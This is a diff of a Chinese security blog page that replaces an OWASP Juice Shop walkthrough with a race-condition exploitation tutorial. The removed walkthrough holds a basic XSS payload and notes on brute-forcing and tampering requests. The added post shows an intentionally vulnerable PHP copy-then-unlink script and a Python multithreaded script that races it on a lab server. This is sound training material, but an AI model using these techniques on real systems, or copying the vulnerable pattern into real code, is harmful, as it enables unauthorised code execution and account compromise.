@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        OWASP Juice Shop v6.4.1部分题目答案｜Elapse&#39; blog
+        Elapse&#39; blog
         
     </title>
 
-    <link rel="canonical" href="https://Ernket.github.io/2018/01/31/OWASP Juice Shop v6.4.1部分题目答案/">
+    <link rel="canonical" href="https://Ernket.github.io/2018/12/22/Web条件竞争利用/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -153,21 +153,15 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>OWASP Juice Shop v6.4.1部分题目答案</h1>
+                    <h1></h1>
                     
                     <span class="meta">
                          作者 Elapse
                         <span>
-                          日期 2018-01-31
+                          日期 2018-12-22
                          </span>
                     </span>
                     <div class="tags text-center">
-                        
-                        <a class="tag" href="/tags/#linux"
-                           title="linux">linux</a>
-                        
-                        <a class="tag" href="/tags/#网络安全"
-                           title="网络安全">网络安全</a>
                         
                     </div>
                 </div>
@@ -176,7 +170,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            OWASP Juice Shop v6.4.1部分题目答案
+            
         </span>
     </div>
 </header>
@@ -187,46 +181,29 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h1 id="OWASP-Juice-Shop-v6-4-1部分题目答案"><a href="#OWASP-Juice-Shop-v6-4-1部分题目答案" class="headerlink" title="OWASP Juice Shop v6.4.1部分题目答案"></a>OWASP Juice Shop v6.4.1部分题目答案</h1><blockquote>
-<p>OWASP Juice Shop是一个专门用于安全技能训练的靶场环境</p>
-</blockquote>
-<p>安装完成后的界面:<br><img src="http://i2.51cto.com/images/blog/201801/31/01a22ba974bd92cfdc2a97447ffd46ef.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<ol>
-<li>Score Board<br>这题的意思是找到一个隐藏的计分界面，通过查看网页源代码可查出<br><img src="http://i2.51cto.com/images/blog/201801/31/baf8f6a12bbb9be28be97aee1aa37f80.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>之后打开页面即可<br><img src="http://i2.51cto.com/images/blog/201801/31/adc848d569348d601731b5fb53b0192a.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li>Admin Section&amp;Error Handling<br>访问商店管理部分。这个网站一用工具爆破就会崩溃，所以这里采用手工，在试了admin和administrator之后皆不成功，百度找了一下还有administration,尝试，成功<br><img src="http://i2.51cto.com/images/blog/201801/31/e026d3565a0fdfa9bca7580c0f6ce18d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li>Password Strength<br>登陆管理员用户，点击登陆,构造语句<br><img src="http://i2.51cto.com/images/blog/201801/31/c527dd45be4abff6e781e4c3a3ac83a2.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>成功登陆<br><img src="http://i2.51cto.com/images/blog/201801/31/277aee7092c11b3ee786366340d58cc7.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li>Five-Star Feedback<br>将所有5星反馈全部删除即可<br><img src="http://i2.51cto.com/images/blog/201801/31/a751d3f265cd922fa4411f81e2b27e76.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>完成<br><img src="http://i2.51cto.com/images/blog/201801/31/a5124bc5980c0179aa02a570cb18ec74.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li>XSS Tier 1<br>往页面插入恶意代码,随意找一个框，构造语句<br><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code><br><img src="http://i2.51cto.com/images/blog/201801/31/81096a672de1d5128e0bd7ead732de39.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>Enter,完成<br><img src="http://i2.51cto.com/images/blog/201801/31/5b10b1d6062be6052b3efa27d73f4eea.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li>Zero Stars<br>最简单的一个，随意登陆一个用户，在”联系我们”处，随意发一个反馈，然后将数据包内容更改<br><img src="http://i2.51cto.com/images/blog/201801/31/b8d230c5886fa8781dbabe79c45eef43.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>将“2”改为0即可<br><img src="http://i2.51cto.com/images/blog/201801/31/5e1d5fe0b5ed2d93fe8f38063f0b2026.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li>Basket Access<br>进入别人的购物篮，很简单，只需要改包即可<br><img src="http://i2.51cto.com/images/blog/201801/31/4f33887b5b705d6a7c0048f057d9746d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>将”1”改为其他数字，发送即可<br><img src="http://i2.51cto.com/images/blog/201801/31/228f2b3bbf3b22450254d4c06d7e47b6.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li>Password Strength<br>规定使用密码登陆，不用语句。打开工具密码爆破，得出密码为admin123，在回到登陆界面，登陆即可完成<br><img src="http://i2.51cto.com/images/blog/201801/31/00b27824afa6b8f246f6c715e68b67d6.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="http://i2.51cto.com/images/blog/201801/31/4292144c5ef467f611e1d7d2f2383a38.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
-<li><p>Reset Jim’s Password<br>通过上一道题可以得出邮箱是”@juice-sh.op”,打开登陆界面，点击忘记密码，输入邮箱<br><img src="http://i2.51cto.com/images/blog/201801/31/6d62d3dc17433a004f8e2573f5837cb5.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<blockquote>
-<p>这里面的Samuel来自于星战梗</p>
-</blockquote>
-</li>
-<li><p>Login Jim<br>上面改了用户Jim的密码后直接登陆即可</p>
-</li>
-</ol>
-<hr>
-<blockquote>
-<p>总结<br>这个渗透环境包含了许多有代表性的漏洞，在许多漏洞上也需要通过抓取数据包来分析，由于自身的技术不够，所以只解决了上面这些题目，不得不说这个环境对于初入这方面的人来说是不错的</p>
-</blockquote>
+                <h1 id="类似前言一样的东西"><a href="#类似前言一样的东西" class="headerlink" title="类似前言一样的东西"></a>类似前言一样的东西</h1><p>条件竞争是真的好玩，佛了</p>
+<p>#解释<br>先上例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">print</span>(<span class="string">"Hello,This is test server"</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))&#123;</span></span><br><span class="line"><span class="php">		copy($_GET[<span class="string">'src'</span>],$_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">		unlink($_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">print</span>(<span class="string">"Error!"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>这是典型的条件竞争利用的点，正常的服务器操作，是copy参数src的文件名和参数dst的文件名，复制完毕后，立马unlink删除，那么条件竞争呢，就是利用复制完毕，卡还没来得及删除的时间点，访问文件，执行恶意代码，而恶意代码已经执行完成了，那么文件删不删除都不重要了，具体的流程如下图<br><img src="http://t1.aixinxi.net/o_1cvb5umk7lo14bt1ibc1bb1tn5a.jpg-j.jpg" alt=""><br>一目了然，小天才说的就是我吧</p>
+<p>#环境搭建</p>
+<ul>
+<li>靶机: CentOS6.5</li>
+<li>PHP</li>
+</ul>
+<p>首先现在靶机安装httpd服务，再安装php<br>完成后，开始配置环境<br><img src="http://t1.aixinxi.net/o_1cvb66l211rls7nf54ig7kbm6a.png-j.jpg" alt=""><br>Elapse.php和file.php的内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Elapse.php:</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">print</span>(<span class="string">"Hello,This is test server"</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))&#123;</span></span><br><span class="line"><span class="php">		copy($_GET[<span class="string">'src'</span>],$_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">		unlink($_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">print</span>(<span class="string">"Error!"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">-----------优秀的分割线-----------</span><br><span class="line"></span><br><span class="line">file.php:</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$myfile = fopen(<span class="string">"test.txt"</span>,<span class="string">"w"</span>);</span></span><br><span class="line"><span class="php">$txt = <span class="string">"ElapseNB\n"</span>;</span></span><br><span class="line"><span class="php">fwrite($myfile,$txt);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>具体利用方式就是，通过访问Elapse.php，传入参数将file.php copy出来然后同时访问新文件<br>这里用的是python3多线程<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">'http://192.168.1.111/Elapse.php?src=file.php&amp;dst=myfile.php'</span></span><br><span class="line">url2 = <span class="string">'http://192.168.1.111/myfile.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filecreate</span><span class="params">(url)</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			requests.get(url)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			print(<span class="string">"not find file"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	threads = []</span><br><span class="line">	<span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">		t1 = threading.Thread(target=filecreate,args=(url1,))</span><br><span class="line">		t2 = threading.Thread(target=filecreate,args=(url2,))</span><br><span class="line">		threads.append(t1)</span><br><span class="line">		threads.append(t2)</span><br><span class="line">		t1.start()</span><br><span class="line">		t2.start()</span><br><span class="line">	print(<span class="string">"Successful!"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
+<p>创建两个线程，同时访问两个url<br>运行结果:<br><img src="http://t1.aixinxi.net/o_1cvb6q0s01usu1al81dvk1qippfja.png-j.jpg" alt=""></p>
+<p><img src="http://t1.aixinxi.net/o_1cvb6oisfcnr10kukkd1q9fv95a.png-j.jpg" alt=""><br>在服务器种可以看到多出来了一个文件，内容为ElapseNB</p>
+<p>(小天才说的就是我8)<br>带哥们觉得代码有用不妨打个赏吧，都是纯手敲的呀，不是百度复制来的，小elapse没钱吃肉包了: )</p>
 
                 <hr>
                 
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2018/02/02/OWASP Juice Shop v6.4.1部分题目答案（二）/" data-toggle="tooltip" data-placement="top"
-                           title="OWASP Juice Shop v6.4.1部分题目答案（二）">&larr; Previous Post</a>
-                    </li>
-                    
                     
                     <li class="next">
-                        <a href="/2018/01/30/CentOS7安装Docker/" data-toggle="tooltip" data-placement="top"
-                           title="CentOS7安装Docker">Next Post &rarr;</a>
+                        <a href="/2018/12/11/Python3栅栏密码解密/" data-toggle="tooltip" data-placement="top"
+                           title="Python3栅栏密码解密">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -242,7 +219,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OWASP-Juice-Shop-v6-4-1部分题目答案"><span class="toc-text">OWASP Juice Shop v6.4.1部分题目答案</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#类似前言一样的东西"><span class="toc-text">类似前言一样的东西</span></a></li></ol>
                 </div>
             </div>
         </div>
